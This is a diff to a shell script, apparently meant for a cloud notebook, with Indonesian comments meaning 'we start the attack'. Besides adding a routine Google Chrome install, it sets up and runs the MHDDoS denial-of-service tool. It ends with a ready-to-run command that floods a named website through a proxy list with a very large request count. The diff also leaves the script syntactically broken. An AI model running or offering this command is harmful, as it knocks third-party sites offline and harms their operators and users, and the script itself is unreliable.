@@ -62,6 +62,16 @@ else
     exit
 fi
 
+# Install Google Chrome
+printf "$g$b    Installing Google Chrome $endc$enda" >&2
+{
+    wget https://dl.google.com/linux/direct/google-chrome-stable_current_amd64.deb
+    sudo dpkg --install google-chrome-stable_current_amd64.deb
+    sudo apt install --assume-yes --fix-broken
+} &> /dev/null &&
+printf "\r$c$b    Google Chrome Installed $endc$enda\n" >&2 ||
+printf "\r$r$b    Error Occured $endc$enda\n" >&2
+
 # kita mulai penyerangan
 printf "\n$g$b    kita mulai penyerangan $endc$enda" >&2
 {
@@ -69,8 +79,4 @@ printf "\n$g$b    kita mulai penyerangan $endc$enda" >&2
 ! cd MHDDoS
 ! pip3 install -r requirements.txt
 ! python3 start.py
-} &> /dev/null &&
-printf "\r$c$b   kita mulai penyerangan  $endc$enda\n" >&2 ||
-printf "\r$r$b    Error Occured $endc$enda\n" >&2
-
 ! python3 start.py ovh https://beta.welovecloudflare.de 1 10000000000 proxy.txt 1000 8585
